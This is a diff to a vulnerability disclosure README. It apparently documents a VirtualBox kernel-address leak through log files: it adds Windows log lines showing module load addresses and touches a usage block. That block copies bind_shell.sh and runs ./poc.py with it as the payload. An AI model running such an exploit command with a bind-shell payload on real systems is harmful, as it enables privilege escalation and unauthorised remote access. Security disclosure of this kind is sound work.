@@ -50,6 +50,23 @@ Sorry, this is NOT a security problem and not a problem at all. Having these
 addresses is not a problem because special permissions are required to make use
 of them.
 
+
+##### Also on Windows
+
+```
+Version:
+VirtualBox Graphical User Interface
+Version 5.1.14 r112924 (Qt5.6.2)
+Copyright C 2017 Oracle Corporation and/or its affiliates. All rights
+reserved
+
+Log snippet:
+00:00:02.468739 GUI: UIMediumEnumerator: Medium-enumeration finished!
+00:00:02.593887 SUP: Loaded VMMR0.r0 (C:\Program Files\Oracle\VirtualBox\VMMR0.r0) at 0xfffff8001d330000 - ModuleInit at fffff8001d353550 and ModuleTerm at fffff8001d353a40 using the native ring-0 loader
+00:00:02.593933 SUP: VMMR0EntryEx located at fffff8001d356450 and VMMR0EntryFast at fffff8001d354170
+00:00:02.593954 SUP: windbg> .reload /f C:\Program Files\Oracle\VirtualBox\VMMR0.r0=0xfffff8001d330000
+```
+
 ## Why POC?
 
 This is a security issue because the leaking of kernel addresses allows an
@@ -112,7 +129,7 @@ virtualenv -p python3.5 .venv
 pip install -r requirements.txt
 make load
 cp bind_shell.sh /tmp/
-./poc.py $(find / -name VMMR0.r0 -print -quit 2>/dev/null) 42 /tmp/bind_shell.sh 
+./poc.py $(find / -name VMMR0.r0 -print -quit 2>/dev/null) 42 /tmp/bind_shell.sh
 ```
 
 ## Impact
